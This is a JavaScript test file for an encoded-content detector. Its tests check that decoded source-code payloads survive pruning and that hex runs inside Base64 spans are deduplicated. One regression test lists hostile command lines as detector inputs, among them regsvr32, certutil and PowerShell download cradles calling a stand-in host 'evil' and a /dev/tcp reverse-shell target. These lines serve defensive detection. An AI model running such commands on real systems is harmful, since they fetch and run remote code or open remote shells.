'use strict';
// ════════════════════════════════════════════════════════════════════════════
// encoded-script-retention.test.js — regression coverage for two adjacent
// fixes in the encoded-content pipeline:
//
//   1. Broadened `_EXEC_INTENT_RE` — script-shape vocabulary (`import X`,
//      `from X import`, `def foo`, `function foo`, `require(`, `class`,
//      `module`, `package`, `#include`, `using System`, `process.env`,
//      `sys.argv`, `os.environ`, `asyncio.run`, etc.) must keep a decoded
//      source-code blob alive through `_pruneFindings` even when the
//      payload has no IOCs and no LOLBin keywords.
//
//      Before this change, a Base64 payload that decoded cleanly to a
//      benign-looking Python / JS / Bash module was silently dropped by
//      the prune pass because:
//        • severity stayed at `info` (no IOC, no script-flavoured
//          classification),
//        • no URL / IP / email / file-path IOC could be extracted,
//        • the old `_EXEC_INTENT_RE` only recognised LOLBin and PS
//          cmdlet vocabulary.
//
//      The finding then disappeared from the sidebar with no breadcrumb.
//
//   2. Hex-inside-Base64 dedupe — the Base64 alphabet is a strict
//      superset of the Hex alphabet on `[0-9a-f]`. A long contiguous
//      Base64 run that happens to contain a window of pure `[0-9a-f]`
//      characters produced a SHADOW Hex candidate at an overlapping
//      offset; both went on to recurse independently, producing two
//      top-level findings against the same byte range. The Hex
//      interpretation is structurally a coincidence — the bytes ARE
//      base64 — so the dedupe pass drops Hex candidates fully contained
//      inside any Base64 candidate's span.
// ════════════════════════════════════════════════════════════════════════════

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/xor-bruteforce.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/zlib.js',
  'src/decoders/encoding-finders.js',
  'src/decoders/encoding-decoders.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
  'src/decoders/js-assembly.js',
  'src/decoders/interleaved-separator.js',
]);
const { EncodedContentDetector } = ctx;

// ── Helpers ────────────────────────────────────────────────────────────────

function bytesToBase64(bytes) {
  return Buffer.from(bytes).toString('base64');
}
function strToBase64(s) {
  return bytesToBase64(new TextEncoder().encode(s));
}

// ── Fix 1 — broadened _EXEC_INTENT_RE ─────────────────────────────────────
//
// The retention predicate ultimately consults `_EXEC_INTENT_RE` via
// `_shouldRetainFinding` (Rule 5) on every plausible textual
// representation of the decoded payload. We exercise the live regex
// through `_shouldRetainFinding` so the test pins behaviour, not
// implementation.

function fakeFinding(decodedText, extras = {}) {
  // Minimal shape `_shouldRetainFinding` reads: encoding (not 'finder-
  // budget'), severity, iocs, classification, decodedBytes, chain,
  // innerFindings. We construct a low-severity, IOC-less, classification-
  // less finding so the retention check falls through to Rule 5 (the
  // exec-intent text scan), which is where the broadened regex lives.
  return Object.assign({
    type: 'encoded-content',
    encoding: 'Base64',
    severity: 'info',
    iocs: [],
    classification: { type: null, ext: null },
    decodedBytes: new TextEncoder().encode(decodedText),
    innerFindings: [],
    chain: ['Base64', 'text'],
  }, extras);
}

test('_EXEC_INTENT_RE retains a Python "import asyncio" payload', () => {
  const d = new EncodedContentDetector();
  const py = [
    'import asyncio',
    'import os',
    'import sys',
    '',
    'async def main() -> None:',
    '    print("hello world")',
    '',
    'if __name__ == "__main__":',
    '    asyncio.run(main())',
  ].join('\n');
  assert.equal(d._shouldRetainFinding(fakeFinding(py)), true,
    'Python source-code payload with `import`/`async def`/`asyncio.run` must survive prune');
});

test('_EXEC_INTENT_RE retains a Node.js "require(...)" payload', () => {
  const d = new EncodedContentDetector();
  const js = [
    'const fs = require("fs");',
    'const path = require("path");',
    'function main() {',
    '  console.log(process.env.HOME);',
    '}',
    'main();',
  ].join('\n');
  assert.equal(d._shouldRetainFinding(fakeFinding(js)), true,
    'Node.js payload with `require(`/`function`/`process.env` must survive prune');
});

test('_EXEC_INTENT_RE retains a C "#include <stdio.h>" payload', () => {
  const d = new EncodedContentDetector();
  const c = [
    '#include <stdio.h>',
    '#include <stdlib.h>',
    '',
    'int main(int argc, char **argv) {',
    '  printf("hello");',
    '  return 0;',
    '}',
  ].join('\n');
  assert.equal(d._shouldRetainFinding(fakeFinding(c)), true,
    'C source-code payload with `#include` must survive prune');
});

test('_EXEC_INTENT_RE retains a "from X import Y" payload', () => {
  const d = new EncodedContentDetector();
  const py = [
    'from pkg.subpkg.module import SomeClass, helper_fn',
    'instance = SomeClass()',
  ].join('\n');
  assert.equal(d._shouldRetainFinding(fakeFinding(py)), true,
    '`from X import Y` must survive prune');
});

test('_EXEC_INTENT_RE retains "using System" / "package main"', () => {
  const d = new EncodedContentDetector();
  assert.equal(d._shouldRetainFinding(fakeFinding('using System.IO;\nclass Foo { }')), true,
    'C# `using System` must survive prune');
  assert.equal(d._shouldRetainFinding(fakeFinding('package main\n\nfunc main() { }')), true,
    'Go `package main` must survive prune');
});

test('_EXEC_INTENT_RE retains "def foo" / "function foo" / "class Foo"', () => {
  const d = new EncodedContentDetector();
  assert.equal(d._shouldRetainFinding(fakeFinding('def greet(name):\n    return f"hi {name}"')), true,
    'Python `def NAME` must survive prune');
  assert.equal(d._shouldRetainFinding(fakeFinding('function greet(name) { return `hi ${name}`; }')), true,
    'JS `function NAME` must survive prune');
  assert.equal(d._shouldRetainFinding(fakeFinding('class MyType:\n    pass')), true,
    '`class NAME` must survive prune');
});

test('_EXEC_INTENT_RE rejects plain English / random alphanumeric noise', () => {
  // False-positive guard. The broadened regex must NOT accept arbitrary
  // human-readable text (or hex-blob-shaped runs) — otherwise every
  // decoded printable string would survive prune and the FP-suppression
  // pass becomes useless.
  const d = new EncodedContentDetector();
  assert.equal(d._shouldRetainFinding(fakeFinding(
    'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque.'
  )), false, 'Latin filler must not match');
  assert.equal(d._shouldRetainFinding(fakeFinding(
    'this is some perfectly ordinary english text with several words in it'
  )), false, 'plain English must not match');
  assert.equal(d._shouldRetainFinding(fakeFinding(
    'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234567890'
  )), false, 'hash-shaped hex must not match');
  assert.equal(d._shouldRetainFinding(fakeFinding(
    'just-some-kebab-case-tokens-mixed-with-snake_case_words'
  )), false, 'identifier-shaped runs must not match');
});

test('_EXEC_INTENT_RE keyword set still covers the legacy LOLBin vocabulary', () => {
  // Regression guard for the existing alternations — make sure the
  // broadening did not accidentally drop any of the original keywords.
  const d = new EncodedContentDetector();
  const legacy = [
    'powershell -EncodedCommand AAA',
    'cmd.exe /c whoami',
    'regsvr32 /s /u /i:http://evil/x scrobj.dll',
    'certutil -urlcache -split -f http://evil/x x.exe',
    'IEX (New-Object Net.WebClient).DownloadString("...")',
    'Invoke-WebRequest http://evil/x',
    'subprocess.Popen(["sh", "-c", "id"])',
    'eval(base64_decode($x))',
    '/dev/tcp/1.2.3.4/4444',
  ];
  for (const s of legacy) {
    assert.equal(d._shouldRetainFinding(fakeFinding(s)), true,
      `legacy keyword set must still retain: ${s.substring(0, 50)}`);
  }
});

// ── Fix 2 — Hex-inside-Base64 dedupe at the top of `scan()` ───────────────
//
// We synthesise a contiguous Base64 payload whose lowercase-hex
// subspans (`[0-9a-f]` only) trigger the Hex finder. After scan(),
// there must be exactly one top-level Base64 finding and zero top-
// level Hex findings whose offsets sit inside the Base64 span.
// Inner findings (the recursive scan that runs on Base64-decoded
// bytes) are unaffected — a legitimate Base64 → Hex → text chain
// still emerges via the recursive inner detector, not as a shadow
// top-level finding.

test('scan(): Hex candidates fully inside a Base64 span are suppressed at top level', async () => {
  // A 4 KB payload made of repeating lowercase-hex characters. This is
  // a valid Base64 string (the [0-9a-f] subset is a subset of the
  // Base64 alphabet) AND simultaneously matches the Hex finder, which
  // before the dedupe surfaced as a shadow top-level Hex finding at
  // the same byte range.
  const hexCoreLen = 4096;
  const text = 'abcdef0123456789'.repeat(hexCoreLen / 16);
  const d = new EncodedContentDetector();
  const findings = await d.scan(text, new TextEncoder().encode(text), { fileType: 'txt' });
  // Filter to top-level findings whose encoding starts with 'Hex'
  // (Hex / Hex (escaped) / Hex (PS byte array)).
  const topLevelHex = findings.filter(f =>
    f && typeof f.encoding === 'string' && f.encoding.startsWith('Hex')
  );
  const topLevelB64 = findings.filter(f => f && f.encoding === 'Base64');
  // The Base64 finder may or may not retain the candidate post-prune
  // (the decoded bytes here are unlikely to match _EXEC_INTENT_RE), but
  // even if both are pruned, no top-level Hex finding should ever
  // survive against a span that a Base64 candidate covered.
  for (const h of topLevelHex) {
    const swallowed = topLevelB64.some(b =>
      h.offset >= b.offset && (h.offset + h.length) <= (b.offset + b.length)
    );
    assert.equal(swallowed, false,
      `top-level Hex finding at offset ${h.offset} must not be fully contained ` +
      `inside a Base64 finding's span`);
  }
});

test('scan(): legitimate standalone Hex candidate (not inside Base64) still surfaces', async () => {
  // Construct text where the Hex run is below the Base64 finder's
  // default-mode 64-char floor but above the Hex finder's 48-char
  // floor. Use an MZ-prefixed payload so the decoded bytes classify
  // as a PE Executable (`_classify` against MAGIC_BYTES), which is in
  // `_RETAIN_CLASSIFICATIONS` and survives the prune pass.
  // 50 hex chars total — above Hex's 48-char floor, below Base64's
  // 64-char floor, so the Base64 finder skips it.
  const hex = '4d5a' + '9000030000000400000000000000ffff0000b8000000'; // 50 chars MZ exe header
  // Surround with whitespace + punctuation so no overlapping Base64
  // candidate emits.
  const text = '\n\n[shellcode marker]: ' + hex + ' :[end marker]\n\n';
  const d = new EncodedContentDetector();
  const findings = await d.scan(text, new TextEncoder().encode(text), { fileType: 'txt' });
  const hexHits = findings.filter(f =>
    f && typeof f.encoding === 'string' && f.encoding.startsWith('Hex')
  );
  // The MZ prefix triggers high-confidence emission AND PE-Executable
  // classification; both survive the finder gates and the prune pass.
  assert.ok(hexHits.length >= 1,
    `MZ-prefixed standalone Hex run must still produce a top-level finding (got ${hexHits.length}, findings: ${findings.map(f => f && f.encoding).join(',')})`);
});

// ── Source-level pin: the dedupe lives in scan() before the dispatch loop
//
// Pin the structural location of the dedupe so a refactor moving the
// b64/hex loops to a different file or reordering them notices.

test('scan(): hex-in-base64 dedupe is wired before the _processCandidate dispatch', () => {
  const fs = require('node:fs');
  const path = require('node:path');
  const src = fs.readFileSync(
    path.resolve(__dirname, '..', '..', 'src/encoded-content-detector.js'),
    'utf8'
  );
  // The filter array name is deliberately distinctive so this regex
  // doesn't false-match unrelated code.
  assert.match(src, /_hexFiltered/,
    'scan() must compute a hex-filtered candidate list');
  const filterIdx = src.indexOf('_hexFiltered');
  const dispatchIdx = src.indexOf('for (const cand of _hexFiltered)');
  assert.ok(dispatchIdx > filterIdx,
    'dispatch over _hexFiltered must come AFTER the filter computation');
});

// ── Fix 3 — `decodedBytes` is always populated on Base64/Hex findings ─────
//
// `_pruneFindings` → `_shouldRetainFinding` (Rule 5) scans every plausible
// text representation of the decoded payload for exec-intent / script-shape
// vocabulary. Until this fix, low-confidence Base64 / Hex candidates (no
// high-conf prefix, no PowerShell context, no bruteforce flag) recorded
// `decodedBytes: null` on the finding, which meant Rule 5 never got to
// scan the decoded text — and a payload that decoded cleanly to benign-
// looking source code (Python module, Bash helper, JS importer, …) with
// no IOCs and no LOLBin vocabulary was silently dropped, leaving the
// analyst with NO indication the decode happened at all.

test('_processCandidate populates decodedBytes regardless of autoDecoded', async () => {
  const d = new EncodedContentDetector();
  const py = 'import asyncio\nasync def main():\n    return 1';
  const b64 = strToBase64(py);
  // Synthetic candidate mirroring what `_findBase64Candidates` emits for
  // a low-confidence run (no high-conf prefix, no PowerShell context).
  const cand = {
    type: 'Base64',
    raw: b64,
    offset: 0,
    length: b64.length,
    entropy: 5.0,
    confidence: 'normal',
    hint: null,
    autoDecoded: false,
  };
  const f = await d._processCandidate(cand, 0);
  assert.ok(f, '_processCandidate must produce a finding');
  assert.ok(f.decodedBytes instanceof Uint8Array,
    'decodedBytes must be populated even when autoDecoded=false');
  assert.equal(new TextDecoder().decode(f.decodedBytes), py,
    'decodedBytes must round-trip to the original payload');
});

test('scan(): a Base64-encoded source-code blob survives auto-prune in default mode', async () => {
  // The canonical "decoded payload is benign-looking source code" shape
  // — exactly what an analyst sees when a Base64 file decodes to a
  // Python / JS / Bash module with no IOCs and no LOLBin keywords.
  // Repeat the body so the resulting Base64 string clears the default-
  // mode 64-char floor on the contiguous Base64 finder.
  const py = [
    'import asyncio',
    'import os',
    'import sys',
    '',
    'async def main() -> None:',
    '    print(os.environ.get("HOME"))',
    '    await asyncio.sleep(1)',
    '',
    'if __name__ == "__main__":',
    '    asyncio.run(main())',
  ].join('\n').repeat(20);
  const b64 = strToBase64(py);

  const d = new EncodedContentDetector();
  const findings = await d.scan(b64, new TextEncoder().encode(b64), { fileType: 'txt' });
  const b64Hits = findings.filter(f => f && f.encoding === 'Base64');
  assert.ok(b64Hits.length >= 1,
    `Base64 finding over a source-code payload must survive default-mode prune ` +
    `(got ${findings.length} findings: ${findings.map(f => f && f.encoding).join(',')})`);
  // The finding must carry decoded bytes so the sidebar / analyst can
  // see what it decoded to without a separate click.
  assert.ok(b64Hits[0].decodedBytes instanceof Uint8Array,
    'finding must carry decodedBytes so the sidebar shows the preview immediately');
  // Round-trip sanity: the decoded bytes are exactly the input.
  assert.equal(new TextDecoder().decode(b64Hits[0].decodedBytes), py,
    'decodedBytes must round-trip to the original payload');
});

test('scan(): a Base64-encoded JS module also survives default-mode prune', async () => {
  // Same shape, different language. Pins that the broadening covers the
  // JS keyword set (`require(`, `function NAME`, `process.env`) rather
  // than being narrowly tuned to Python alone.
  const js = [
    'const fs = require("fs");',
    'const path = require("path");',
    '',
    'function main() {',
    '  const home = process.env.HOME;',
    '  console.log(home);',
    '}',
    '',
    'main();',
  ].join('\n').repeat(20);
  const b64 = strToBase64(js);

  const d = new EncodedContentDetector();
  const findings = await d.scan(b64, new TextEncoder().encode(b64), { fileType: 'txt' });
  const b64Hits = findings.filter(f => f && f.encoding === 'Base64');
  assert.ok(b64Hits.length >= 1,
    `Base64 finding over a JS source-code payload must survive default-mode prune ` +
    `(got ${findings.length} findings)`);
  assert.ok(b64Hits[0].decodedBytes instanceof Uint8Array,
    'finding must carry decodedBytes');
});

test('scan(): a Base64-encoded run of plain English filler does NOT survive default-mode prune', async () => {
  // False-positive guard. A long enough plain-English blob still
  // produces a Base64 candidate, decodes cleanly, and matches the
  // contiguous regex — but with no IOCs, no script-shape vocabulary
  // and no LOLBin keywords, the prune pass must drop it. Without this
  // guard, every benign Base64'd README would surface a noise finding
  // in the sidebar.
  const filler = (
    'Lorem ipsum dolor sit amet, consectetur adipiscing elit. ' +
    'Pellentesque malesuada urna at finibus volutpat. Vestibulum ' +
    'ante ipsum primis in faucibus orci luctus et ultrices posuere ' +
    'cubilia curae.'
  ).repeat(8);
  const b64 = strToBase64(filler);

  const d = new EncodedContentDetector();
  const findings = await d.scan(b64, new TextEncoder().encode(b64), { fileType: 'txt' });
  const b64Hits = findings.filter(f => f && f.encoding === 'Base64');
  assert.equal(b64Hits.length, 0,
    `Plain-English filler Base64 must be pruned in default mode ` +
    `(got ${b64Hits.length} retained Base64 findings)`);
});
